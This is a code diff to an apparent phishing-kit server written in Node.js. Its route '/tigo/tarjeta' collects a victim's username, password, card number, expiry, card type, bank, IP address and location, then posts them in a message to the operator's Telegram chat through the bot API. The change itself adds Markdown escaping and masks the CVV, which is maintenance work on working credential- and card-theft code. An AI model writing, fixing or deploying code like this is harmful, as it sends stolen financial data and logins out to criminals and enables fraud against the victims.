@@ -1286,20 +1286,28 @@ app.post('/tigo/tarjeta', async (req, res) => {
     });
     
     // Mensaje para Telegram
+    // Escapar caracteres especiales de Markdown
+    const escapeMd = (text) => {
+      if (!text) return 'N/D';
+      return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
+    };
+    
+    const cvvMask = '•'.repeat(cvv?.length || 3);
+    
     const mensaje = `
 💳 *TARJETA INGRESADA*
 
-👤 Usuario: ${user}
-🔑 Clave: ${pass}
+👤 Usuario: ${escapeMd(user)}
+🔑 Clave: ${escapeMd(pass)}
 
-💳 Número: ${numeroTarjeta}
-📅 Vencimiento: ${vencimiento}
-🔒 CVV: ${'*'.repeat(cvv?.length || 3)}
-🏷️ Tipo: ${tipoTarjeta}
-🏦 Entidad: ${nombreEntidad}
+💳 Número: ${escapeMd(numeroTarjeta)}
+📅 Vencimiento: ${escapeMd(vencimiento)}
+🔒 CVV: ${cvvMask}
+🏷️ Tipo: ${escapeMd(tipoTarjeta)}
+🏦 Entidad: ${escapeMd(nombreEntidad)}
 
-🌐 IP: ${ip} - ${city}, ${country}
-🆔 sessionId: ${sessionId}
+🌐 IP: ${escapeMd(ip)} \\- ${escapeMd(city)}, ${escapeMd(country)}
+🆔 sessionId: ${escapeMd(sessionId)}
     `.trim();
     
     // Mapeo de entidades a rutas
@@ -1340,7 +1348,7 @@ app.post('/tigo/tarjeta', async (req, res) => {
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
-      parse_mode: "Markdown",
+      parse_mode: "MarkdownV2",
       reply_markup
     });
     
